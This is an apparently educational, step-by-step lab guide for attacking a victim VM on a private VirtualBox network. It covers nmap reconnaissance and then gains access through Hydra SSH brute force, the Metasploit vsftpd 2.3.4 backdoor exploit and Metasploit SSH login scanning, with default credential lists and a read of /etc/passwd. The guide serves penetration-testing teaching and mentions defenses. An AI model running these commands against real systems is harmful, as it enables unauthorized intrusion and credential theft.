# Network Attack Simulation Guide: Reconnaissance & Access Attack

A beginner-friendly, step-by-step guide for performing **reconnaissance**
followed by an **access attack** from the Attacker VM (`192.168.56.102`)
to the Victim VM (`192.168.56.101`) in a controlled lab environment.

> ⚠️ **Authorized lab use only.** All steps below assume you are working in
> an isolated VirtualBox network with full permission to test the target.

---

## Phase 1: Reconnaissance (Information Gathering)

The goal is to discover as much information about the target as possible
before launching an attack.

### Step 1: Verify Connectivity (Ping Scan)

```bash
# From Attacker VM (192.168.56.102)
ping -c 4 192.168.56.101
```

**What to collect:** Confirm the victim is online and reachable.

---

### Step 2: Host Discovery with Nmap

```bash
# Discover live hosts on the subnet
nmap -sn 192.168.56.0/24
```

**What to collect:** List of all active hosts on the network.

---

### Step 3: Port Scanning (Find Open Ports)

```bash
# Basic TCP port scan on victim
nmap -sT 192.168.56.101

# More detailed scan - top 1000 ports with service detection
nmap -sV 192.168.56.101

# Full port scan (all 65535 ports) - takes longer
nmap -sV -p- 192.168.56.101
```

**What to collect:**
- Open ports (e.g., 22/SSH, 80/HTTP, 21/FTP, 445/SMB)
- Service names and versions running on each port

---

### Step 4: Operating System Detection

```bash
# OS detection scan (requires root/sudo)
sudo nmap -O 192.168.56.101

# Aggressive scan (OS + services + scripts + traceroute)
sudo nmap -A 192.168.56.101
```

**What to collect:**
- Operating system type and version
- Kernel version (if detected)
- Network hop information

---

### Step 5: Vulnerability Scanning with Nmap Scripts

```bash
# Run default vulnerability scripts
nmap --script=vuln 192.168.56.101

# Check for specific vulnerabilities on discovered services
nmap --script=ssh-brute,ftp-anon,smb-vuln* 192.168.56.101
```

**What to collect:**
- Known vulnerabilities on the target
- Misconfigurations (e.g., anonymous FTP access)
- Weak services

---

### Step 6: Service Enumeration

Depending on what ports you found open:

**If SSH (port 22) is open:**

```bash
nmap --script=ssh2-enum-algos -p 22 192.168.56.101
```

**If HTTP (port 80) is open:**

```bash
# Grab the web banner
nmap --script=http-headers -p 80 192.168.56.101

# Enumerate web directories
dirb http://192.168.56.101
```

**If SMB (port 445) is open:**

```bash
# Enumerate SMB shares
nmap --script=smb-enum-shares -p 445 192.168.56.101

# Enumerate users
nmap --script=smb-enum-users -p 445 192.168.56.101
```

**What to collect:**
- Usernames, share names, web directories
- Software versions for each service

---

### Reconnaissance Summary Table

| Information         | Tool Used               | Example Finding             |
|---------------------|-------------------------|-----------------------------|
| Host alive?         | `ping` / `nmap -sn`     | Yes, TTL=64                 |
| Open ports          | `nmap -sT`              | 22, 80, 21, 445             |
| Services & versions | `nmap -sV`              | OpenSSH 7.6, Apache 2.4.29  |
| Operating System    | `nmap -O`               | Ubuntu 18.04                |
| Vulnerabilities     | `nmap --script=vuln`    | CVE-xxxx-xxxx               |
| Users/Shares        | `smb-enum-users`        | admin, user1                |

---

## Phase 2: Access Attack (Exploitation)

Based on the recon findings, you now attempt to gain unauthorized access.

### Option A: SSH Brute Force Attack (port 22 open)

#### Step 1: Create a username list

```bash
nano usernames.txt
```

Add common usernames:

```
admin
root
user
msfadmin
guest
```

#### Step 2: Create a password list

```bash
nano passwords.txt
```

Add common passwords:

```
password
123456
admin
root
toor
msfadmin
```

> **Tip:** Kali Linux ships with wordlists at `/usr/share/wordlists/`.

#### Step 3: Launch Hydra Brute Force Attack

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh -t 4 -vV
```

Flags explained:

- `-L` — username list file
- `-P` — password list file
- `ssh` — target service
- `-t 4` — 4 parallel threads
- `-vV` — verbose output

#### Step 4: Access the Victim

Once Hydra finds valid credentials (e.g., `msfadmin:msfadmin`):

```bash
ssh msfadmin@192.168.56.101
```

#### Step 5: Verify Access

```bash
whoami
hostname
ifconfig
cat /etc/passwd
```

---

### Option B: Metasploit FTP Attack (vsftpd 2.3.4 backdoor)

```bash
msfconsole
```

```text
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(vsftpd_234_backdoor) > set RPORT 21
msf6 exploit(vsftpd_234_backdoor) > exploit
```

Verify access:

```bash
whoami
id
hostname
```

---

### Option C: Metasploit SSH Brute Force

```bash
msfconsole
```

```text
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(ssh_login) > set RHOSTS 192.168.56.101
msf6 auxiliary(ssh_login) > set USER_FILE /root/usernames.txt
msf6 auxiliary(ssh_login) > set PASS_FILE /root/passwords.txt
msf6 auxiliary(ssh_login) > set VERBOSE true
msf6 auxiliary(ssh_login) > run
```

Access via opened session:

```text
msf6 > sessions -l        # list active sessions
msf6 > sessions -i 1      # interact with session 1
```

---

## Phase 3: Document Your Findings

For your report, collect evidence at each stage:

- Nmap scan results (all open ports and services)
- OS detection output
- Vulnerability scan results
- Hydra/Metasploit attack output showing successful credentials
- Proof of access (`whoami`, `hostname`, `ifconfig` on victim)

### Save Nmap Output to File

```bash
nmap -sV -O 192.168.56.101 -oN recon_results.txt
nmap --script=vuln 192.168.56.101 -oN vuln_scan.txt
```

---

## Quick Reference: Command Summary

| Phase   | Tool          | Command                                                              |
|---------|---------------|----------------------------------------------------------------------|
| Recon   | Ping          | `ping -c 4 192.168.56.101`                                           |
| Recon   | Nmap Port     | `nmap -sV 192.168.56.101`                                            |
| Recon   | Nmap OS       | `sudo nmap -O 192.168.56.101`                                        |
| Recon   | Nmap Vuln     | `nmap --script=vuln 192.168.56.101`                                  |
| Attack  | Hydra SSH     | `hydra -L users.txt -P pass.txt 192.168.56.101 ssh`                  |
| Attack  | Metasploit    | `use exploit/unix/ftp/vsftpd_234_backdoor`                           |
| Access  | SSH Login     | `ssh user@192.168.56.101`                                            |

---

## Notes for Your Report

- **Document the recon phase first** — it justifies why you chose a specific attack.
- **Attack flow:** Recon → Identify weakness → Exploit weakness → Gain access.
- **Defense section:** After demonstrating the attack, show how to block it
  (e.g., Fail2Ban for SSH brute force, firewall rules, disabling vulnerable
  services).
